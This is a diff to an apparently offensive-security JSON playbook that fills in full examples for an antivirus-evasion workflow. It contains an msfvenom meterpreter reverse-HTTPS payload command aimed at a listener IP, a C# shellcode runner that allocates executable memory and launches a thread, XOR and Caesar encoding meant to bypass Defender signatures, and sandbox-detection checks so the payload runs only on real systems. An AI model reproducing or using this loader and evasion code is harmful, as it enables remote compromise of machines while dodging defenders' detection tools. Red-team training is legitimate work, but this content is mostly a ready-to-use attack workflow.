@@ -22,7 +22,7 @@
         {
           "title": "Scenario 1: Msfvenom Payload Caught by Defender (Basic Runner)",
           "context": "Standard msfvenom reverse shell (windows/x64/meterpreter/reverse_https) detected immediately when written to disk. Need custom C# runner to evade signature-based detection.",
-          "approach": "Phase 1: Shellcode Generation (2 minutes)\n- Generate raw shellcode with msfvenom-csharp-payload\n- Save output as byte array\n\nPhase 2: Basic Runner Creation (5 minutes)\n- Use csharp-shellcode-runner-basic template\n- Embed shellcode byte array into C# code\n- Replace placeholder with actual shellcode\n\nPhase 3: Compilation & Testing (3 minutes)\n- Compile with compile-csharp-runner (using csc.exe)\n- Test locally with Defender enabled\n- Expect detection at this stage (baseline)\n\nPhase 4: Add Encryption Layer (5 minutes)\n- Apply csharp-xor-encrypt to shellcode\n- Update runner to decrypt at runtime\n- Recompile and test—should evade basic signatures",
+          "approach": "Phase 1: Shellcode Generation (2 minutes)\n- Generate raw shellcode with msfvenom-csharp-payload\n- Save output as byte array\n\nPhase 2: Basic Runner Creation (5 minutes)\n- Use csharp-shellcode-runner-basic template\n- Embed shellcode byte array into C# code\n- Replace placeholder with actual shellcode\n\nPhase 3: Compilation & Testing (3 minutes)\n- Compile with compile-csharp-runner (using csc.exe)\n- Test locally with Defender enabled\n- Expect detection at this stage (baseline)\n\nPhase 4: Add Encryption Layer (5 minutes)\n- Apply csharp-xor-encrypt to shellcode\n- Update runner to decrypt at runtime\n- Recompile and test\u2014should evade basic signatures",
           "commands": [
             "msfvenom-csharp-payload",
             "csharp-shellcode-runner-basic",
@@ -57,7 +57,7 @@
             "compile-csharp-runner"
           ],
           "expected_outcome": "Sandbox evasion successful in 12-15 minutes. Payload executes on real systems, aborts in analysis environments.",
-          "why_this_works": "NUMA API (VirtualAllocExNuma) not emulated in most sandboxes—call fails, indicating VM. Sleep measurement detects time acceleration. Dual checks increase confidence."
+          "why_this_works": "NUMA API (VirtualAllocExNuma) not emulated in most sandboxes\u2014call fails, indicating VM. Sleep measurement detects time acceleration. Dual checks increase confidence."
         },
         {
           "title": "Scenario 4: Production Compilation (End-to-End Workflow)",
@@ -77,40 +77,72 @@
       "sections": [
         {
           "title": "Phase 1: Shellcode Generation",
-          "notes": "Start with raw shellcode in C# byte array format. Avoid executable formats at this stage—focus on getting raw bytes ready for embedding.",
+          "notes": "Start with raw shellcode in C# byte array format. Avoid executable formats at this stage\u2014focus on getting raw bytes ready for embedding.",
           "commands": [
-            "msfvenom-csharp-payload"
+            {
+              "id": "msfvenom-csharp-payload",
+              "example": "msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f csharp",
+              "shows": "Shellcode byte array in C# format:\nbyte[] buf = new byte[..."
+            }
           ]
         },
         {
           "title": "Phase 2: Basic Runner Framework",
-          "notes": "Create minimal C# runner that allocates memory and executes shellcode. This WILL be detected—it's your baseline for testing encryption effectiveness.",
+          "notes": "Create minimal C# runner that allocates memory and executes shellcode. This WILL be detected\u2014it's your baseline for testing encryption effectiveness.",
           "commands": [
-            "csharp-shellcode-runner-basic",
-            "compile-csharp-runner"
+            {
+              "id": "csharp-shellcode-runner-basic",
+              "example": "using System;\nusing System.Runtime.InteropServices;\n\nnamespace ShellcodeRunner {\n    class Program {\n        [DllImport(\"kernel32\")]\n        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);\n        \n        [DllImport(\"kernel32\")]\n        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);\n        \n        [DllImport(\"kernel32\")]\n        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);\n        \n        static void Main(string[] args) {\n            byte[] buf = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0 };\n            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);\n            Marshal.Copy(buf, 0, addr, buf.Length);\n            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);\n            WaitForSingleObject(hThread, 0xFFFFFFFF);\n        }\n    }\n}",
+              "shows": "No console output. Shellcode executes (e.g., reverse shel..."
+            },
+            {
+              "id": "compile-csharp-runner",
+              "example": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:runner.exe Program.cs",
+              "shows": "runner.exe created in current directory. No output = succ..."
+            }
           ]
         },
         {
           "title": "Phase 3: Encryption Layers",
           "notes": "Apply multiple encryption algorithms sequentially. Order matters: Encrypt with Caesar, then XOR. Decrypt in reverse order at runtime. Test after each layer to find minimum required.",
           "commands": [
-            "csharp-caesar-encrypt",
-            "csharp-xor-encrypt"
+            {
+              "id": "csharp-caesar-encrypt",
+              "example": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { 0xfc,0x48,0x83 };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);\n}\n// Print encoded array\nConsole.WriteLine(\"byte[] encoded = new byte[] { \" + string.Join(\",\", encoded.Select(b => $\"0x{b:X2}\")) + \" };\");\n\n// DECRYPTION (runtime in runner)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);\n}",
+              "shows": "Encrypted runner bypasses static signatures. Shellcode ex..."
+            },
+            {
+              "id": "csharp-xor-encrypt",
+              "example": "// ENCRYPTION (offline)\nbyte[] buf = new byte[] { 0xfc,0x48,0x83 };\nbyte[] encoded = new byte[buf.Length];\nfor(int i = 0; i < buf.Length; i++) {\n    encoded[i] = (byte)((uint)buf[i] ^ 0xAA);\n}\n\n// DECRYPTION (runtime - same operation)\nfor(int i = 0; i < buf.Length; i++) {\n    buf[i] = (byte)((uint)buf[i] ^ 0xAA);\n}",
+              "shows": "XOR encrypted payload bypasses more signatures than Caesa..."
+            }
           ]
         },
         {
           "title": "Phase 4: Sandbox Evasion",
           "notes": "Add environment validation checks. NUMA API check is most reliable (API not emulated). Sleep timers useful but can be bypassed. Combine multiple checks for higher confidence.",
           "commands": [
-            "csharp-non-emulated-api",
-            "csharp-sleep-timer"
+            {
+              "id": "csharp-non-emulated-api",
+              "example": "using System;\nusing System.Runtime.InteropServices;\n\n[DllImport(\"kernel32.dll\", SetLastError = true, ExactSpelling = true)]\nstatic extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);\n\n[DllImport(\"kernel32.dll\")]\nstatic extern IntPtr GetCurrentProcess();\n\n// Sandbox check\nIntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);\nif(mem == null) {\n    return; // Sandbox detected - API not emulated\n}\n// Continue with payload",
+              "shows": "In sandbox: Exits (NULL returned). On real system: Contin..."
+            },
+            {
+              "id": "csharp-sleep-timer",
+              "example": "using System;\nusing System.Threading;\n\nDateTime t1 = DateTime.Now;\nThread.Sleep(10000);\ndouble deltaT = DateTime.Now.Subtract(t1).TotalSeconds;\nif(deltaT < 9.5) {\n    return; // Sandbox detected - exit\n}\n// Continue with payload execution",
+              "shows": "In sandbox: Exits immediately (sandbox detected). On real..."
+            }
           ]
         },
         {
           "title": "Phase 5: Final Compilation",
           "notes": "Always compile with release flags (/optimize+) for production. Debug builds leak metadata and have different signatures. Test final binary on fresh VM with Defender enabled.",
           "commands": [
-            "compile-csharp-runner"
+            {
+              "id": "compile-csharp-runner",
+              "example": "C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\csc.exe /out:runner.exe Program.cs",
+              "shows": "runner.exe created in current directory. No output = succ..."
+            }
           ]
         }
       ],
